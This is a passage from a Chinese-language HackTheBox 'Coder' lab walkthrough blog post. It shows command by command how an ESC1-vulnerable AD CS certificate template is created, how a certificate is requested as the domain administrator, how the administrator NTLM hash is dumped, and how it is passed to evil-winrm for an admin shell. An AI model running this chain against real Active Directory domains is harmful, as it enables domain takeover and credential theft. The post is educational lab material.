+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-&lt;ROOT@kali:~/hackthebox/machine/coder&gt;-                                                                          -&lt;pts/6&gt;-</span><br><span class="line">-&lt;<span class="comment">#&gt;- certipy find -u e.black -p ypOSJXPqlDOxxbQSfEERy300 -target coder.htb -text</span></span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 34 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 12 enabled certificate templates</span><br><span class="line">[*] Trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;coder-DC01-CA&#x27;</span> via CSRA</span><br><span class="line">[!] Got error <span class="keyword">while</span> trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;coder-DC01-CA&#x27;</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.</span><br><span class="line">[*] Trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;coder-DC01-CA&#x27;</span> via RRP</span><br><span class="line">[!] Failed to connect to remote registry. Service should be starting now. Trying again...</span><br><span class="line">[*] Got CA configuration <span class="keyword">for</span> <span class="string">&#x27;coder-DC01-CA&#x27;</span></span><br><span class="line">[*] Saved text output to <span class="string">&#x27;20231220224850_Certipy.txt&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder11.png"></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">33</span><br><span class="line">   Template Name                       : User</span><br><span class="line">   Display Name                        : User</span><br><span class="line">   Certificate Authorities             : coder-DC01-CA</span><br><span class="line">   Enabled                             : True</span><br><span class="line">   Client Authentication               : True</span><br><span class="line">   Enrollment Agent                    : False</span><br><span class="line">   Any Purpose                         : False</span><br><span class="line">   Enrollee Supplies Subject           : False</span><br><span class="line">   Certificate Name Flag               : SubjectRequireDirectoryPath</span><br><span class="line">                                         SubjectRequireEmail</span><br><span class="line">                                         SubjectAltRequireEmail</span><br><span class="line">                                         SubjectAltRequireUpn</span><br><span class="line">   Enrollment Flag                     : AutoEnrollment</span><br><span class="line">                                         PublishToDs</span><br><span class="line">                                         IncludeSymmetricAlgorithms</span><br><span class="line">   Private Key Flag                    : ExportableKey</span><br><span class="line">   Extended Key Usage                  : Encrypting File System</span><br><span class="line">                                         Secure Email</span><br><span class="line">                                         Client Authentication</span><br><span class="line">   Requires Manager Approval           : False</span><br><span class="line">   Requires Key Archival               : False</span><br><span class="line">   Authorized Signatures Required      : 0</span><br><span class="line">   Validity Period                     : 1 year</span><br><span class="line">   Renewal Period                      : 6 weeks</span><br><span class="line">   Minimum RSA Key Length              : 2048</span><br><span class="line">   Permissions</span><br><span class="line">     Enrollment Permissions</span><br><span class="line">       Enrollment Rights               : CODER.HTB\Domain Admins</span><br><span class="line">                                         CODER.HTB\Domain Users</span><br><span class="line">                                         CODER.HTB\Enterprise Admins</span><br><span class="line">     Object Control Permissions</span><br><span class="line">       Owner                           : CODER.HTB\Enterprise Admins</span><br><span class="line">       Write Owner Principals          : CODER.HTB\Domain Admins</span><br><span class="line">                                         CODER.HTB\Enterprise Admins</span><br><span class="line">       Write Dacl Principals           : CODER.HTB\Domain Admins</span><br><span class="line">                                         CODER.HTB\Enterprise Admins</span><br><span class="line">       Write Property Principals       : CODER.HTB\Domain Admins</span><br><span class="line">                                         CODER.HTB\Enterprise Admins</span><br></pre></td></tr></table></figure>
+
+<p>复制一个易受ESC1影响的。BlackHills有一篇很好的<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL2FidXNpbmctYWN0aXZlLWRpcmVjdG9yeS1jZXJ0aWZpY2F0ZS1zZXJ2aWNlcy1wYXJ0LW9uZS8=">Abusing Active Directory Certificate Services – Part One<i class="fa fa-external-link-alt"></i></span>，列出了ESC1所需的内容，包括以下图片:</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder12.png"></li>
+</ul>
+<p>与上面的”computer”模板相比，需要更改”Enrollee Supplies Subject”和”Certificate Name Flag”。如果在Certipy仓库中搜索该字符串，看到它们可能是相关的，并且ENROLLEE_SUPPLIES_SUBJECT值为1:</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder13.png"></li>
+</ul>
+<p>它与msPKI-Certificate-Name-Flag有关。像上面那样在PowerShell中获得一个模板作为对象:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; Export-ADCSTemplate -displayName Computer &gt; computer.json</span><br><span class="line">*Evil-WinRM* PS C:\programdata&gt; <span class="variable">$computer</span> = <span class="built_in">cat</span> computer.json -raw | ConvertFrom-Json</span><br></pre></td></tr></table></figure>
+
+<p>可以找到需要更改的属性的确切名称:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; <span class="variable">$computer</span> | get-member | findstr Name-Flag</span><br><span class="line">msPKI-Certificate-Name-Flag   NoteProperty int msPKI-Certificate-Name-Flag=402653184</span><br></pre></td></tr></table></figure>
+
+<p>把它改成0x1</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; <span class="variable">$computer</span>.<span class="string">&#x27;msPKI-Certificate-Name-Flag&#x27;</span> = 0x1</span><br></pre></td></tr></table></figure>
+
+<p>现在将其输出到JSON中，然后创建模板，并注册e.black:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; <span class="variable">$computer</span> | ConvertTo-Json | Set-Content computer-mod-esc1.json</span><br><span class="line">*Evil-WinRM* PS C:\programdata&gt; New-ADCSTemplate -DisplayName <span class="string">&quot;0xdf-ESC1&quot;</span> -Publish -JSON (<span class="built_in">cat</span> computer-mod-esc1.json -raw)</span><br><span class="line">*Evil-WinRM* PS C:\programdata&gt; Set-ADCSTemplateACL -DisplayName <span class="string">&quot;0xdf-ESC1&quot;</span> -<span class="built_in">type</span> allow -identity <span class="string">&#x27;coder\e.black&#x27;</span> -enroll</span><br></pre></td></tr></table></figure>
+
+<p>如果扫描Coder与证书现在寻找易受攻击的模板(-vulnerable)，这个新的模板:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">-&lt;ROOT@kali:~/hackthebox/machine/coder&gt;-                                                                          -&lt;pts/6&gt;-</span><br><span class="line">-&lt;<span class="comment">#&gt;- certipy find -u e.black -p ypOSJXPqlDOxxbQSfEERy300 -target coder.htb -text -stdout -vulnerable</span></span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 35 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 13 enabled certificate templates</span><br><span class="line">[*] Trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;coder-DC01-CA&#x27;</span> via CSRA</span><br><span class="line">[!] Got error <span class="keyword">while</span> trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;coder-DC01-CA&#x27;</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.</span><br><span class="line">[*] Trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;coder-DC01-CA&#x27;</span> via RRP</span><br><span class="line">[!] Failed to connect to remote registry. Service should be starting now. Trying again...</span><br><span class="line">[*] Got CA configuration <span class="keyword">for</span> <span class="string">&#x27;coder-DC01-CA&#x27;</span></span><br><span class="line">[*] Enumeration output:</span><br><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">    CA Name                             : coder-DC01-CA</span><br><span class="line">    DNS Name                            : dc01.coder.htb</span><br><span class="line">    Certificate Subject                 : CN=coder-DC01-CA, DC=coder, DC=htb</span><br><span class="line">    Certificate Serial Number           : 2180F0D10CFECB9840260D0730724BDF</span><br><span class="line">    Certificate Validity Start          : 2022-06-29 03:51:44+00:00</span><br><span class="line">    Certificate Validity End            : 2052-06-29 04:01:44+00:00</span><br><span class="line">    Web Enrollment                      : Disabled</span><br><span class="line">    User Specified SAN                  : Disabled</span><br><span class="line">    Request Disposition                 : Issue</span><br><span class="line">    Enforce Encryption <span class="keyword">for</span> Requests     : Enabled</span><br><span class="line">    Permissions</span><br><span class="line">      Owner                             : CODER.HTB\Administrators</span><br><span class="line">      Access Rights</span><br><span class="line">        ManageCertificates              : CODER.HTB\Administrators</span><br><span class="line">                                          CODER.HTB\Domain Admins</span><br><span class="line">                                          CODER.HTB\Enterprise Admins</span><br><span class="line">        ManageCa                        : CODER.HTB\Administrators</span><br><span class="line">                                          CODER.HTB\Domain Admins</span><br><span class="line">                                          CODER.HTB\Enterprise Admins</span><br><span class="line">        Enroll                          : CODER.HTB\Authenticated Users</span><br><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : 0xdf-ESC1</span><br><span class="line">    Display Name                        : 0xdf-ESC1</span><br><span class="line">    Certificate Authorities             : coder-DC01-CA</span><br><span class="line">    Enabled                             : True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollment Agent                    : False</span><br><span class="line">    Any Purpose                         : False</span><br><span class="line">    Enrollee Supplies Subject           : True</span><br><span class="line">    Certificate Name Flag               : EnrolleeSuppliesSubject</span><br><span class="line">    Enrollment Flag                     : AutoEnrollment</span><br><span class="line">    Private Key Flag                    : AttestNone</span><br><span class="line">    Extended Key Usage                  : Server Authentication</span><br><span class="line">                                          Client Authentication</span><br><span class="line">    Requires Manager Approval           : False</span><br><span class="line">    Requires Key Archival               : False</span><br><span class="line">    Authorized Signatures Required      : 0</span><br><span class="line">    Validity Period                     : 1 year</span><br><span class="line">    Renewal Period                      : 6 weeks</span><br><span class="line">    Minimum RSA Key Length              : 2048</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights               : CODER.HTB\Erron Black</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                           : CODER.HTB\Erron Black</span><br><span class="line">        Full Control Principals         : CODER.HTB\Domain Admins</span><br><span class="line">                                          CODER.HTB\Local System</span><br><span class="line">                                          CODER.HTB\Enterprise Admins</span><br><span class="line">        Write Owner Principals          : CODER.HTB\Domain Admins</span><br><span class="line">                                          CODER.HTB\Local System</span><br><span class="line">                                          CODER.HTB\Enterprise Admins</span><br><span class="line">        Write Dacl Principals           : CODER.HTB\Domain Admins</span><br><span class="line">                                          CODER.HTB\Local System</span><br><span class="line">                                          CODER.HTB\Enterprise Admins</span><br><span class="line">        Write Property Principals       : CODER.HTB\Domain Admins</span><br><span class="line">                                          CODER.HTB\Local System</span><br><span class="line">                                          CODER.HTB\Enterprise Admins</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC1                              : <span class="string">&#x27;CODER.HTB\\Erron Black&#x27;</span> can enroll, enrollee supplies subject and template allows client authentication</span><br><span class="line">      ESC4                              : Template is owned by CODER.HTB\Erron Black</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder14.png"></li>
+</ul>
+<p>ESC1是配置的，ESC4是因为e.black拥有模板(因此可以滥用它)。</p>
+<ul>
+<li>Exploit ESC1</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-&lt;ROOT@kali:~/hackthebox/machine/coder&gt;-                                                                          -&lt;pts/6&gt;-</span><br><span class="line">-&lt;<span class="comment">#&gt;- ntpdate dc01.coder.htb</span></span><br><span class="line">2023-12-20 23:14:02.635290 (-0500) -0.015002 +/- 0.157799 dc01.coder.htb 10.10.11.207 s1 no-leap</span><br><span class="line">-&lt;ROOT@kali:~/hackthebox/machine/coder&gt;-                                                                          -&lt;pts/6&gt;-</span><br><span class="line">-&lt;<span class="comment">#&gt;- certipy req -u e.black -p ypOSJXPqlDOxxbQSfEERy300 -target coder.htb -ca coder-DC01-CA -template 0xdf-ESC1 -upn administrator@coder.htb</span></span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 25</span><br><span class="line">[*] Got certificate with UPN <span class="string">&#x27;administrator@coder.htb&#x27;</span></span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to <span class="string">&#x27;administrator.pfx&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder15.png"></li>
+</ul>
+<p>使用administrator.pfx dump administrator的NTLM hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-&lt;ROOT@kali:~/hackthebox/machine/coder&gt;-                                                                          -&lt;pts/6&gt;-</span><br><span class="line">-&lt;<span class="comment">#&gt;- certipy auth -pfx administrator.pfx</span></span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: administrator@coder.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;administrator.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator@coder.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:807726fcf9f188adc26eeafd7dc16bb7</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder16.png"></li>
+</ul>
+<h2 id="WinRM-administrator-shell"><a href="#WinRM-administrator-shell" class="headerlink" title="WinRM administrator shell"></a>WinRM administrator shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-&lt;ROOT@kali:~/hackthebox/machine/coder&gt;-                                                                          -&lt;pts/6&gt;-</span><br><span class="line">-&lt;<span class="comment">#&gt;- evil-winrm -i dc01.coder.htb -u administrator -H 807726fcf9f188adc26eeafd7dc16bb7</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">coder\administrator</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">cat</span> ../Desktop/root.txt</span><br><span class="line">9480de5c3cdffb5a4e42606911ff066e</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder17.png"></li>
+</ul>
+<h1 id="Reference-Sources"><a href="#Reference-Sources" class="headerlink" title="Reference Sources"></a>Reference Sources</h1><ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDIzLzEyLzE2L2h0Yi1jb2Rlci5odG1s">0xdf’s blog Coder walkthrough<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="fdvoid0 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="fdvoid0 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>fdvoid0
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2023/12/19/coder/" title="HackTheBox Coder [Bloodhound AD Enumeration + ADCS CVE-2022-26923]">https://fdlucifer.github.io/2023/12/19/coder/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="fa fa-stack-exchange"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/DC/" rel="tag"><i class="fa fa-tag"></i> DC</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/12/11/htb-authority/" rel="prev" title="HackTheBox Authority [ansible hash crack + ESC1 attack + pass-the-cert attack]">
+                  <i class="fa fa-chevron-left"></i> HackTheBox Authority [ansible hash crack + ESC1 attack + pass-the-cert attack]
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">fdvoid0</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>Word count total: </span>
+    <span title="Word count total">653k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>Reading time total &asymp;</span>
+    <span title="Reading time total">39:36</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
